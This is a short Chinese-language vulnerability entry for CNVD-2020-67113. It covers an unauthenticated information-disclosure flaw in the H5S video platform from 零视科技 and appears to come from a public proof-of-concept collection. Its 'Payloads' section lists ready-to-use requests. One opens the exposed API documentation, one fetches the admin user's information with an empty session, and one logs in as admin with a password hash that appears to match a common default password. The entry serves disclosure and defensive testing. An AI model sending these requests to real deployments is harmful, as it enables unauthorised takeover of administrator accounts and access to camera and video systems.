# 零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞 CNVD-2020-67113

## 漏洞描述
零视技术(上海)有限公司是以领先的视频技术服务于客户，致力于物联网视频开发简单化，依托于HTML5 WebRTC 等新的技术，实现全平台视频播放简单化。 零视技术(上海)有限公司H5S CONSOLE存在未授权访问漏洞。攻击者可利用漏洞访问后台相应端口，执行未授权操作。

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登录页面

![image-20220525151716667](images/202205251517010.png)

API文档可以未授权访问

```
/doc/api.html
```


## Payloads
```
/doc/api.html
```
```
/api/v1/GetUserInfo?user=admin&session=
```
```
/api/v1/Login?user=admin&password=827ccb0eea8a706c4c34a16891f84e7b
```
